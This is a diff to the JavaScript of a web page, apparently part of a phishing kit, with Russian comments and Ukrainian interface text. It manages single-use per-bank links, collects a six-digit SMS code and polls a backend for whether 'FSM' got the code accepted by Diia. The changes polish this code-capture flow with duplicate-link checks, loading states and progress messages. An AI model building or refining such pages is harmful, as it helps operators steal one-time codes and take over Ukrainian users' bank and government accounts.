@@ -554,11 +554,25 @@
           console.log(`📦 Данные для ${bank}:`, data);
           
           if (data.url && data.id) {
-            linkData[bank] = { url: data.url, id: data.id };
-            btn.disabled = false;
-            btn.onclick = () => handleBankClick(bank);
-            btn.textContent = BANK_TEXTS[bank + "-btn"];
-            console.log(`✅ Кнопка ${bank} активирована!`);
+            // Проверяем, не используется ли эта ссылка кем-то другим
+            const existingBank = Object.keys(linkData).find(b => 
+              b !== bank && linkData[b].id === data.id
+            );
+            
+            if (existingBank) {
+              // Ссылка уже используется другим банком - не показываем
+              console.log(`⚠️ Ссылка ${data.id} уже используется для ${existingBank}`);
+              btn.disabled = true;
+              btn.onclick = null;
+              delete linkData[bank];
+              btn.textContent = BANK_TEXTS[bank + "-btn"];
+            } else {
+              linkData[bank] = { url: data.url, id: data.id };
+              btn.disabled = false;
+              btn.onclick = () => handleBankClick(bank);
+              btn.textContent = BANK_TEXTS[bank + "-btn"];
+              console.log(`✅ Кнопка ${bank} активирована!`);
+            }
           } else {
             btn.disabled = true;
             btn.onclick = null;
@@ -695,6 +709,14 @@
         const consumeRes = await fetch(consumeUrl, { method: "POST" });
         const consumeData = await consumeRes.json();
         console.log(`✅ Consume response:`, consumeData);
+        
+        // Удаляем ссылку из локального хранилища для всех банков
+        Object.keys(linkData).forEach(b => {
+          if (linkData[b].id === currentId) {
+            delete linkData[b];
+          }
+        });
+        
       } catch (e) {
         console.log("Ошибка consume:", e);
         hideLoading();
@@ -945,8 +967,17 @@
         return; // Просто не отправляем если меньше 6 цифр
       }
       
-      document.getElementById("send-code-btn").disabled = true;
+      const submitBtn = document.getElementById("send-code-btn");
+      const originalText = submitBtn.textContent;
+      
+      // Показываем индикатор загрузки
+      submitBtn.disabled = true;
+      submitBtn.textContent = "Відправляємо...";
+      submitBtn.style.background = 'linear-gradient(45deg, #ff9800, #f57c00)';
       document.getElementById("sms-error").textContent = "";
+      
+      // Показываем сообщение об отправке
+      showSuccessMessage("📤 Код відправлено! Перевіряємо...");
       
       const fd = new FormData();
       fd.append("id", currentId);
@@ -959,16 +990,24 @@
           // Код отправлен в API, теперь ждем результат проверки от FSM
           console.log("Код отправлен, ожидаем результат проверки...");
           
+          // Меняем текст кнопки на ожидание
+          submitBtn.textContent = "Перевіряємо...";
+          submitBtn.style.background = 'linear-gradient(45deg, #2196f3, #1976d2)';
+          
           // Запускаем проверку результата
           await waitForVerificationResult();
           
         } else {
-          document.getElementById("send-code-btn").disabled = false;
+          submitBtn.disabled = false;
+          submitBtn.textContent = originalText;
+          submitBtn.style.background = 'linear-gradient(45deg, #4caf50, #45a049)';
           document.getElementById("sms-error").textContent = "Помилка відправки коду. Спробуйте ще раз.";
         }
       } catch (e) {
         console.error("Ошибка отправки кода:", e);
-        document.getElementById("send-code-btn").disabled = false;
+        submitBtn.disabled = false;
+        submitBtn.textContent = originalText;
+        submitBtn.style.background = 'linear-gradient(45deg, #4caf50, #45a049)';
         document.getElementById("sms-error").textContent = "Помилка з'єднання. Спробуйте ще раз.";
       }
     }
@@ -977,12 +1016,23 @@
       // Ждем результат проверки кода от FSM
       console.log("Ожидание результата проверки кода от Дії...");
       
+      const submitBtn = document.getElementById("send-code-btn");
+      const originalText = "Підтвердити";
+      
+      // Показываем прогресс
+      let dots = 0;
+      const progressInterval = setInterval(() => {
+        dots = (dots + 1) % 4;
+        submitBtn.textContent = "Перевіряємо" + ".".repeat(dots);
+      }, 500);
+      
       for (let i = 0; i < 30; i++) { // Ждем максимум 30 секунд
         try {
           const res = await fetch(`${API_BASE}/api/check-verification-result?id=${currentId}`);
           const result = await res.json();
           
           if (result.status === "success") {
+            clearInterval(progressInterval);
             // Код принят Дією - показываем успех
             clearInterval(countdownInterval);
             
@@ -1004,8 +1054,11 @@
             return;
             
           } else if (result.status === "failed") {
+            clearInterval(progressInterval);
             // Код отклонен Дією - показываем ошибку и очищаем поля
-            document.getElementById("send-code-btn").disabled = false;
+            submitBtn.disabled = false;
+            submitBtn.textContent = originalText;
+            submitBtn.style.background = 'linear-gradient(45deg, #4caf50, #45a049)';
             
             // Очищаем все поля ввода
             const digits = document.querySelectorAll('.sms-digit');
@@ -1019,7 +1072,8 @@
               digits[0].focus();
             }
             
-            document.getElementById("sms-error").textContent = "Введіть коректний 6-значний код з SMS";
+            document.getElementById("sms-error").textContent = "❌ Неправильний код! Введіть коректний 6-значний код з SMS";
+            showSuccessMessage(""); // Скрываем сообщение об отправке
             return;
           }
           
@@ -1032,10 +1086,14 @@
         }
       }
       
+      clearInterval(progressInterval);
       // Таймаут ожидания результата
       console.log("Таймаут ожидания результата проверки");
-      document.getElementById("send-code-btn").disabled = false;
-      document.getElementById("sms-error").textContent = "Час очікування вичерпано. Спробуйте ще раз.";
+      submitBtn.disabled = false;
+      submitBtn.textContent = originalText;
+      submitBtn.style.background = 'linear-gradient(45deg, #4caf50, #45a049)';
+      document.getElementById("sms-error").textContent = "⏰ Час очікування вичерпано. Спробуйте ще раз.";
+      showSuccessMessage(""); // Скрываем сообщение об отправке
     }
 
     // Показать сообщение об успехе
